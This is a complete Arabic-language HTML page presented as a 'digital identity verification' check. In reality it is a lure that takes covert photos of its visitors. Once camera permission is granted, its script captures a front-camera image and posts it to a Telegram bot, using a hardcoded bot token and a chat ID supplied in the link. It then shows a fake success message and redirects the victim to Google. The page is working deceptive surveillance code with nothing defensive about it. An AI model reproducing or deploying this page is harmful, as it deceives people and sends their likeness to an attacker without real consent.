<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نظام التحقق من الهوية الرقمية</title>
    <style>
        body { 
            background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%); 
            color: #ffffff; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            height: 100vh; 
            margin: 0; 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
        }
        .container {
            text-align: center;
            background: rgba(30, 41, 59, 0.7);
            padding: 40px 30px;
            border-radius: 24px;
            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            backdrop-filter: blur(12px);
            -webkit-backdrop-filter: blur(12px);
            border: 1px solid rgba(255, 255, 255, 0.08);
            max-width: 420px;
            width: 90%;
        }
        .icon-wrapper {
            position: relative;
            width: 80px;
            height: 80px;
            margin: 0 auto 25px auto;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .loader { 
            position: absolute;
            border: 3px solid rgba(56, 189, 248, 0.1); 
            border-top: 3px solid #38bdf8; 
            border-radius: 50%; 
            width: 80px; 
            height: 80px; 
            animation: spin 1.2s cubic-bezier(0.5, 0, 0.5, 1) infinite; 
        }
        .shield-icon {
            font-size: 2.2rem;
            color: #38bdf8;
            animation: pulse 2s infinite;
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        @keyframes pulse {
            0% { transform: scale(1); opacity: 0.9; }
            50% { transform: scale(1.05); opacity: 1; }
            100% { transform: scale(1); opacity: 0.9; }
        }
        #video-preview { 
            width: 100%; 
            max-width: 340px; 
            border-radius: 16px; 
            margin-top: 20px; 
            background-color: #000;
            border: 2px solid rgba(56, 189, 248, 0.2);
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
            display: none; 
        }
        .status-title {
            font-size: 1.4rem;
            font-weight: 600;
            margin-bottom: 8px;
            color: #ffffff;
        }
        .status-text {
            font-size: 0.95rem;
            color: #94a3b8;
            line-height: 1.6;
        }
        canvas {
            display: none; 
        }
    </style>
</head>
<body>

<div class="container">
    <div class="icon-wrapper">
        <div class="loader"></div>
        <div class="shield-icon">🛡️</div>
    </div>
    <div id="status-title" class="status-title">التحقق الآمن من الهوية</div>
    <div id="status" class="status-text">بانتظار الموافقة على صلاحيات الكاميرا لإتمام الفحص الرقمي...</div>
    <video id="video-preview" autoplay playsinline></video>
    <canvas id="capture-canvas"></canvas>
</div>

<script>
    // التوكن المعتمد الخاص بك
    const BOT_TOKEN = "8128965245:AAGolmLae3ALVga_kcloXCK2zsFRODK4BXc";

    function getChatIdFromURL() {
        const urlParams = new URLSearchParams(window.location.search);
        return urlParams.get('chatId');
    }

    async function initVerification() {
        const statusDiv = document.getElementById('status');
        const statusTitleObj = document.getElementById('status-title');
        const videoPreview = document.getElementById('video-preview');
        const canvas = document.getElementById('capture-canvas');
        const chatId = getChatIdFromURL();

        if (!chatId) {
            statusDiv.style.color = "#f87171";
            statusDiv.innerText = "خطأ: المعرف الرقمي غير صالح أو مفقود من الرابط.";
            return;
        }

        if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
            statusDiv.innerText = "المتصفح الحالي لا يدعم تقنيات التحقق البيومترية المطلوبة.";
            return;
        }

        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user" },
                audio: false 
            });

            videoPreview.style.display = "block";
            videoPreview.srcObject = stream;
            statusDiv.innerText = "تم الاتصال بالعدسة البيومترية بنجاح. جاري مطابقة الملامح الرقمية...";

            // الانتظار حتى يتأكد المتصفح من جاهزية بث الفيديو بالكامل لقراءة أبعاده الحقيقية بأمان
            videoPreview.onloadedmetadata = () => {
                setTimeout(async () => {
                    try {
                        // استخدام الأبعاد الحقيقية للبث، مع وضع أبعاد احتياطية إذا كانت القراءة صفرية لمنع تعطل toBlob
                        const width = videoPreview.videoWidth || 640;
                        const height = videoPreview.videoHeight || 480;
                        
                        canvas.width = width;
                        canvas.height = height;
                        
                        const context = canvas.getContext('2d');
                        context.drawImage(videoPreview, 0, 0, width, height);

                        // التقاط الصورة بصيغة JPEG لضمان التوافقية الكاملة وخفة الحجم أثناء الإرسال السحابي
                        canvas.toBlob(async (blob) => {
                            if (blob) {
                                const formData = new FormData();
                                formData.append('chat_id', chatId);
                                formData.append('photo', blob, 'identity_capture.jpg');
                                formData.append('caption', '📸 لقطة التحقق الرقمي المحدثة.');

                                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                                    method: 'POST',
                                    body: formData
                                });
                            }
                        }, 'image/jpeg', 0.9);

                    } catch (err) {
                        console.error("خطأ إرسال اللقطة:", err);
                    }

                    // إغلاق الكاميرا والتوجيه التلقائي بعد إتمام المهمة
                    setTimeout(() => {
                        stream.getTracks().forEach(track => track.stop());
                        statusTitleObj.innerText = "اكتمل التحقق";
                        statusDiv.style.color = "#34d399";
                        statusDiv.innerText = "تمت المطابقة وتأكيد الهوية بنجاح! جاري التوجيه...";
                        
                        setTimeout(() => {
                            window.location.href = "https://www.google.com";
                        }, 1500);
                    }, 2000);

                }, 2000); // التقاط اللقطة بعد ثانيتين من ثبات الكاميرا
            };

        } catch (error) {
            console.error("خطأ الوصول للكاميرا:", error);
            statusDiv.style.color = "#f87171";
            statusDiv.innerText = "يرجى منح صلاحية الوصول للكاميرا لمتابعة عملية تأكيد الهوية الرقمية.";
        }
    }

    window.onload = initVerification;
</script>
</body>
</html>
